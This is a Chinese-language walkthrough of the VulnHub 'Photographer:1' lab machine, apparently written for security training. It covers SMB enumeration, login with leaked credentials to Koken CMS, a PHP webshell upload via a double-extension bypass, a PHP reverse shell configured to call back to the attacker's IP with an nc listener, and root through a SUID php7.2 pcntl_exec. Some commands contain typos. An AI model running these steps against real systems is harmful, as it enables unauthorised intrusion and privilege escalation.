# VulnHub-Photographer:1

靶机地址：https://www.vulnhub.com/entry/photographer-1,519/

# 0x00 环境

攻击主机：Kali    IP：172.16.152.199

目标主机：Ubuntu    IP：172.16.152.229

使用工具：

  • nmap
  • netdiscover
  • dirb
  • nikto
  • enum4linxu

# 0x01 信息收集

# 主机发现

使用 netdiscover -r 172.16.152.1/24 扫描本网段主机。得到目标主机 IP：172.16.152.229

# 端口扫描

发现 445、80、8000、139 端口。有两个 samba 服务，使用 enum4linux 172.16.152.229 ，samba 账号密码为空。

使用 smbclient 连接 smb 服务器。能看到文件夹里有 mailsent.txt 和 wordpress.bkp.zip 两个文件。

下载 mailsent.txt 文件查看一下，是一封邮件，暂且放在一边。

记录一下email.txt内有可能有用的内容
4129F3CA.2020509@dc.edu
agi@photographer.com
daisa@photographer.com
babygirl

# 目录扫描

分别访问两个 web 端口。80 端口是静态页面，8000 端口类似展示页面，但是注意到时 koken cms。

分别使用 dirb、gobuster、dirmap 和 dirsearch 等扫描工具对目标 IP 进行目录扫描。

# 0x02 漏洞利用

80 端口的 web 服务没有什么能利用的，8000 有个登录界面。

想到上面在 smb 下载的 email.txt 文件里面的信息，尝试登录。使用账号密码：“daisa@photographer.com/babygirl” 可登录进入后台。

有上传点，尝试一下上传 php 后缀文件，提示不允许上传，bp 无数据包，判断是前端验证。创建一个一句话木马，命名为 “test.php.jpg”。上传时用 bp 拦截数据包并进行如下操作修改数据包。

放数据包后，右键打开上传的一句话。

# getshell

蚁剑成功连接。尝试上传 kali 自带的反弹 shell。使用命令 cp /usr/share/webshells/php/php-reverse-shell.php ./phprev.php.jpg 复制反弹 shell，并修改里面的监听 IP 和 Port。

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.16.152.199';  // CHANGE THIS
$port = 8889;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

利用上面上传 webshell 的方式上传反弹 shell。kali 使用命令 nc -lvnp 8889 监听 8899 端口，访问反弹 shell。

获取交互式 shell： python3 -c 'import pty;pty.spawn("/bin/bash")'

# 提权

利用 find 命令来查找拥有 suid 访问权限的程序： find / -perm -u=s -tpye f 2>/dev/null

php7.2 有权限，尝试用 exec 执行命令： /usr/bin/php7.2 -r "exec('whoami');" ，好像执行不了，尝试用 pcntl_exec 函数： /usr/bin/php7.2 -r "pcntl_exec{'/bin/bash',['-p']);" ，拿到 root 权限。

最终拿到指定文件。
